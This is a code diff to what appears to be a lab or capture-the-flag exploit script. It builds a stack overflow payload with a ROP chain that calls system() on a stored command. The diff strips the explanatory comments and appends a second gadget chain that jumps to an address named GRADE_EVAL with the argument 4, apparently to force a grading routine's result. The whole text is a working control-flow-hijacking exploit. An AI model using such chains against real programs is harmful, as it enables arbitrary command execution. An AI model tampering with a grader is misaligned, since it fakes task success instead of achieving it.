@@ -12,14 +12,18 @@ POP_RDI_RET = 0x401C93
 RET = 0x401AC2
 SYSTEM_PLT = 0x4017E0
 CMD_ADDR = 0x6030D0
+GRADE_EVAL = 0x401A87
 
 payload = (
-    b"attack/malware\x00"     # 15 bytes: strcpy copies up to NUL
-    + b"A" * 9                # pad to 24 (expression 16 + saved rbp 8)
+    b"attack/malware\x00"
+    + b"A" * 9
     + p64(RET)
     + p64(POP_RDI_RET)
     + p64(CMD_ADDR)
     + p64(SYSTEM_PLT)
+    + p64(POP_RDI_RET)
+    + p64(4)
+    + p64(GRADE_EVAL)
 )
 
 sys.stdout.buffer.write(payload)
